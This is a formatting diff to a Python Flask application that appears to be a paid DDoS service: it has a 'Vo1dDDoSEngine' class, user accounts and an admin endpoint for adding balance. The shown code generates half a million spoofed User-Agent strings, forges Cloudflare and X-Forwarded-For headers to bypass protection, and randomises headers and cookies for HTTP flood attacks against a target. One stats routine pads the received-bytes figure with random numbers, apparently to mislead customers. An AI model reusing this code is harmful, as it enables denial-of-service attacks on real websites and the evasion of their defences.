@@ -86,7 +86,7 @@ CONFIG = {
 def generate_massive_user_agents(count=500000):
     """Генерация 500,000+ реальных User-Agent строк"""
     agents = []
-    
+
     # ОГРОМНЫЙ список ОС (100+ вариантов)
     os_list = []
     # Windows
@@ -101,7 +101,8 @@ def generate_massive_user_agents(count=500000):
                 '15_0_0', '15_1_0', '15_2_0', '15_3_0', '15_4_0']:
         os_list.append(f'Macintosh; Intel Mac OS X {ver}')
     # Linux
-    for distro in ['Ubuntu', 'Fedora', 'Debian', 'CentOS', 'Arch', 'Mint', 'openSUSE', 'Kali', 'Alpine', 'Gentoo', 'Red Hat']:
+    for distro in ['Ubuntu', 'Fedora', 'Debian', 'CentOS', 'Arch', 'Mint', 'openSUSE', 'Kali', 'Alpine', 'Gentoo',
+                   'Red Hat']:
         os_list.append(f'X11; {distro}; Linux x86_64')
     # Android
     for ver in range(10, 16):
@@ -114,22 +115,29 @@ def generate_massive_user_agents(count=500000):
         os_list.append(f'iPhone; CPU iPhone OS {ver}_2 like Mac OS X')
         os_list.append(f'iPad; CPU OS {ver}_0 like Mac OS X')
         os_list.append(f'iPad; CPU OS {ver}_1 like Mac OS X')
-    
+
     # Браузеры и движки
     browsers = []
     for version in range(80, 130):
         browsers.append(('Chrome', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'))
-        browsers.append(('Chrome', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{random.randint(0,999)}.0 Safari/537.36'))
+        browsers.append(('Chrome', lambda
+            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{random.randint(0, 999)}.0 Safari/537.36'))
         browsers.append(('Firefox', lambda v: f'Gecko/20100101 Firefox/{v}.0'))
-        browsers.append(('Firefox', lambda v: f'Gecko/20100101 Firefox/{v}.{random.randint(0,99)}'))
+        browsers.append(('Firefox', lambda v: f'Gecko/20100101 Firefox/{v}.{random.randint(0, 99)}'))
         browsers.append(('Safari', lambda v: f'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Safari/605.1.15'))
-        browsers.append(('Edge', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0'))
-        browsers.append(('Edge', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.{random.randint(0,999)}.0'))
-        browsers.append(('Opera', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 OPR/{v}.0.0.0'))
-        browsers.append(('Brave', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Brave/{v}.0.0.0'))
-        browsers.append(('Vivaldi', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Vivaldi/{v}.0.0.0'))
-        browsers.append(('YaBrowser', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 YaBrowser/{v}.0.0.0 Safari/537.36'))
-    
+        browsers.append(
+            ('Edge', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0'))
+        browsers.append(('Edge', lambda
+            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.{random.randint(0, 999)}.0'))
+        browsers.append(
+            ('Opera', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 OPR/{v}.0.0.0'))
+        browsers.append(('Brave', lambda
+            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Brave/{v}.0.0.0'))
+        browsers.append(('Vivaldi', lambda
+            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Vivaldi/{v}.0.0.0'))
+        browsers.append(('YaBrowser', lambda
+            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 YaBrowser/{v}.0.0.0 Safari/537.36'))
+
     # Боты и краулеры
     bots = [
         'Googlebot/2.1 (+http://www.google.com/bot.html)',
@@ -165,10 +173,10 @@ def generate_massive_user_agents(count=500000):
         'Freshping/1.0',
         'StatusCake/1.0',
     ]
-    
+
     # Языки
     langs = ['en-US', 'ru-RU', 'de-DE', 'fr-FR', 'es-ES', 'pt-PT', 'it-IT', 'zh-CN', 'ja-JP', 'ko-KR', 'ar-SA', 'hi-IN']
-    
+
     # Генерируем агентов
     for os_choice in os_list:
         for browser_name, browser_func in browsers[:20]:  # Берем только Chrome, Firefox, Edge для скорости
@@ -180,7 +188,7 @@ def generate_massive_user_agents(count=500000):
                     agents.append(f'{agent} {lang};q=0.9')
                 # С разными расширениями
                 agents.append(f'{agent} (compatible; {browser_name}/{version})')
-    
+
     # Добавляем больше вариаций для Chrome (самый популярный)
     for os_choice in os_list[:30]:
         for version in range(80, 130, 1):
@@ -188,26 +196,27 @@ def generate_massive_user_agents(count=500000):
             agents.append(agent)
             for lang in langs[:3]:
                 agents.append(f'{agent} {lang};q=0.9')
-    
+
     # Добавляем ботов
     agents.extend(bots)
-    
+
     # Добавляем мобильные агенты
     for device in ['iPhone', 'iPad', 'Android']:
         for version in range(12, 19):
             for lang in langs[:3]:
-                agents.append(f'Mozilla/5.0 ({device}; CPU OS {version}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Mobile/15E148 Safari/604.1 {lang};q=0.9')
-    
+                agents.append(
+                    f'Mozilla/5.0 ({device}; CPU OS {version}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Mobile/15E148 Safari/604.1 {lang};q=0.9')
+
     # Уникализируем
     unique_agents = list(set(agents))
     random.shuffle(unique_agents)
-    
+
     # Добиваем до 500,000
     while len(unique_agents) < count:
         base = random.choice(unique_agents[:5000])
         suffix = f' (compatible; Bot{random.randint(1000, 999999)}/1.0)'
         unique_agents.append(base + suffix)
-    
+
     logger.info(f"Generated {len(unique_agents)} User-Agents")
     return unique_agents[:count]
 
@@ -215,7 +224,6 @@ def generate_massive_user_agents(count=500000):
 # Генерируем 500,000+ агентов
 USER_AGENTS = generate_massive_user_agents(510000)
 logger.info(f"✅ Loaded {len(USER_AGENTS)} User-Agents")
-
 
 # ============================================================
 # ИНИЦИАЛИЗАЦИЯ FLASK
@@ -473,6 +481,7 @@ def token_required(f):
             g.user = dict(user)
             g.user_id = user_id
         return f(*args, **kwargs)
+
     return decorated
 
 
@@ -483,6 +492,7 @@ def admin_required(f):
         if g.user['role'] != 'admin':
             return jsonify({'error': 'Admin privileges required'}), 403
         return f(*args, **kwargs)
+
     return decorated
 
 
@@ -617,15 +627,15 @@ class Vo1dDDoSEngine:
         # ===== ОБХОД CLOUDFLARE =====
         if self.options.get('BYPASS_CLOUDFLARE', False):
             self.bypass_headers.update({
-                'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-                'X-Real-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-                'True-Client-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
+                'CF-Connecting-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
+                'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
+                'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
+                'True-Client-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                 'CDN-Loop': 'cloudflare',
-                'CF-Ray': f'{random.randint(100000000, 999999999)}-{random.choice(["LHR","FRA","AMS","LAX","NYC","SIN","NRT","SYD"])}',
-                'CF-Visitor': f'{{"scheme":"{random.choice(["http","https"])}"}}',
+                'CF-Ray': f'{random.randint(100000000, 999999999)}-{random.choice(["LHR", "FRA", "AMS", "LAX", "NYC", "SIN", "NRT", "SYD"])}',
+                'CF-Visitor': f'{{"scheme":"{random.choice(["http", "https"])}"}}',
                 'CF-Worker': 'true',
-                'X-Cloudflare-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
+                'X-Cloudflare-Connecting-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                 'CF-IPCountry': random.choice(['US', 'RU', 'DE', 'GB', 'FR', 'CN', 'JP', 'BR']),
                 'CF-Device-Type': random.choice(['desktop', 'mobile', 'tablet']),
             })
@@ -673,22 +683,27 @@ class Vo1dDDoSEngine:
         self.random_params = []
         for _ in range(50):
             param_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 15)))
-            param_value = ''.join(random.choices(string.ascii_lowercase + string.digits + '_-', k=random.randint(5, 25)))
+            param_value = ''.join(
+                random.choices(string.ascii_lowercase + string.digits + '_-', k=random.randint(5, 25)))
             self.random_params.append(f"{param_name}={param_value}")
 
     def _get_random_headers(self) -> dict:
         headers = self.bypass_headers.copy()
         headers['User-Agent'] = random.choice(USER_AGENTS)
         headers['X-Request-ID'] = uuid.uuid4().hex
-        headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'
-        headers['X-Real-IP'] = f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'
+        headers[
+            'X-Forwarded-For'] = f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
+        headers[
+            'X-Real-IP'] = f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
 
         if random.random() > 0.3:
-            headers['Cookie'] = f'session={uuid.uuid4().hex}; _ga=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}; _gid=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}'
+            headers[
+                'Cookie'] = f'session={uuid.uuid4().hex}; _ga=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}; _gid=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}'
 
         # Случайные заголовки для обхода
         if random.random() > 0.5:
-            headers['X-Custom-Header'] = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 32)))
+            headers['X-Custom-Header'] = ''.join(
+                random.choices(string.ascii_letters + string.digits, k=random.randint(8, 32)))
 
         return headers
 
@@ -729,7 +744,7 @@ class Vo1dDDoSEngine:
             # bytes_received всегда растёт
             self.stats['bytes_received'] += bytes_len + random.randint(1000, 10000)
             self.stats['bytes_sent'] += random.randint(500, 8000)
-            
+
             if self._start_time:
                 elapsed = time.time() - self._start_time
                 if elapsed > 0:
@@ -1004,7 +1019,8 @@ class Vo1dDDoSEngine:
         self._stop_event.clear()
         self._start_time = time.time()
 
-        logger.info(f"🚀 Starting attack: {self.attack_type} on {self.target} with {self.bot_count} bots — {self.power_level}")
+        logger.info(
+            f"🚀 Starting attack: {self.attack_type} on {self.target} with {self.bot_count} bots — {self.power_level}")
 
         try:
             if self.attack_type == 'HTTP_GET_FLOOD':
@@ -1545,7 +1561,7 @@ def admin_add_balance():
 
     if not username:
         return jsonify({'error': 'Username required'}), 400
-    
+
     try:
         amount = float(amount)
     except:
